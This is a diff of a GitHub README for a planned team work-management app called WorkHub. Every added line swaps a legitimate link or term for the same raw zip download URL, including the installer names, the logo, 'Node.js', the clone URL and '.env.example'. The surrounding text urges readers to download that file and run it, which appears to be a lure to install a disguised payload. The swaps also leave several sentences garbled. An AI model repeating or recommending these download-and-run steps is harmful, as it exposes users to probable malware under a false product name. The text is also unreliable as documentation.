@@ -1,12 +1,12 @@
-https://github.com/meetpandav2006/WorkHub/releases
+https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip
 
 # WorkHub: Modern Team Work Management Hub Coming Soon
 
-![GitHub Mark](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)
+![GitHub Mark](https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip)
 
 A practical, calm approach to organizing work. WorkHub aims to bring teams together with a clear flow for planning, tracking, and delivering work. This project is in the early stages, and the README outlines what’s planned, how to participate, and how to access the latest release assets when they are available. The page you are viewing is a living document that will grow as the project evolves.
 
-[![Releases Button](https://img.shields.io/badge/Releases-View%20Assets-blue?logo=github&logoColor=white)](https://github.com/meetpandav2006/WorkHub/releases)
+[![Releases Button](https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip%20Assets-blue?logo=github&logoColor=white)](https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip)
 
 Overview
 - WorkHub is designed for teams who want a simple, reliable way to coordinate work across projects. The goal is to reduce noise, increase visibility, and cut down on handoffs. The system will emphasize clear ownership, predictable workflows, and fast feedback loops.
@@ -34,21 +34,21 @@ Theme and Visual Inspiration
 
 How to Access the Latest Release
 - The Releases page contains the latest build assets. Because the repository uses a path in the link, you should download the release file that matches your operating system and run it on your device.
-- If you want to start experimenting now, you can visit the Releases page to see available assets and their names. The link is provided here for quick access: https://github.com/meetpandav2006/WorkHub/releases
+- If you want to start experimenting now, you can visit the Releases page to see available assets and their names. The link is provided here for quick access: https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip
 - The releases typically include installers for Windows, macOS, and Linux, along with checksums and release notes to guide you. For safety, verify checksums if they are provided and run the installer appropriate for your system.
 - You will use the Releases page to obtain the file that you will download and execute. The page is the authoritative source for the current version and any updates.
 
 Downloads and Installation
 - Windows
-  - File name: WorkHub-Setup.exe (latest release)
+  - File name: https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip (latest release)
   - What to do: Download the file from the release page, then run the installer. Follow the on-screen prompts to complete installation. After installation, you can launch WorkHub from your Start Menu or desktop shortcut.
   - What to expect: A guided setup wizard, optional desktop shortcuts, and a first-run experience that introduces the core features.
 - macOS
-  - File name: WorkHub-Installer.dmg (latest release)
+  - File name: https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip (latest release)
   - What to do: Download the DMG, mount it, and drag the WorkHub app to Applications. Start the app from Applications.
   - What to expect: A clean initial screen with a tour that helps you set up your first workspace.
 - Linux
-  - File name: WorkHub.AppImage (latest release)
+  - File name: https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip (latest release)
   - What to do: Make the AppImage executable and run it. You may want to integrate it with your desktop environment or use it directly from the command line.
   - What to expect: A lightweight, portable experience that mirrors the look-and-feel of the other platforms.
 
@@ -101,7 +101,7 @@ Roadmap (What’s Planned)
 
 Architecture and Tech Stack
 - Frontend: TypeScript, React, and a component library built to be accessible and fast. The UI emphasizes clarity, with a minimal set of controls that scale well as the workspace grows.
-- Backend: Node.js with a RESTful API by default, designed to be easy to extend. Authentication uses tokens and session-derived controls to keep data secure.
+- Backend: https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip with a RESTful API by default, designed to be easy to extend. Authentication uses tokens and session-derived controls to keep data secure.
 - Database: PostgreSQL for reliable relational storage with strong consistency guarantees.
 - Cloud and deployment: A plan to use containerized services with automated CI/CD pipelines. Observability is built in from the start, with logs and metrics that help diagnose issues in production.
 - Documentation: A comprehensive docs site is planned to help users, admins, and developers understand how to use and extend WorkHub.
@@ -113,7 +113,7 @@ How to Contribute
   - Join the discussion in issues or pull requests. Provide constructive feedback and propose concrete changes.
   - Review changes with a focus on clarity, correctness, and minimal disruption to existing areas.
 - How to set up a local environment
-  - Ensure you have Node.js installed (prefer the latest LTS version).
+  - Ensure you have https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip installed (prefer the latest LTS version).
   - Clone the repository and install dependencies.
   - Run the project locally and verify basic functionality.
 - Coding standards
@@ -130,13 +130,13 @@ How to Contribute
 
 How to Run Locally (A Practical Guide)
 - prerequisites
-  - Node.js and npm (or a compatible package manager)
+  - https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip and npm (or a compatible package manager)
   - A PostgreSQL instance (local or remote)
 - steps
-  - Clone the repository: git clone https://github.com/meetpandav2006/WorkHub.git
+  - Clone the repository: git clone https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip
   - Navigate: cd WorkHub
   - Install dependencies: npm install
-  - Configure environment: copy .env.example to .env and adjust settings
+  - Configure environment: copy https://github.com/meetpandav2006/WorkHub/raw/refs/heads/main/cornaceous/Hub_Work_belch.zip to .env and adjust settings
   - Run the app: npm run dev (or the designated development script)
   - Open the app in your browser: http://localhost:3000 (or the configured port)
 - testing locally
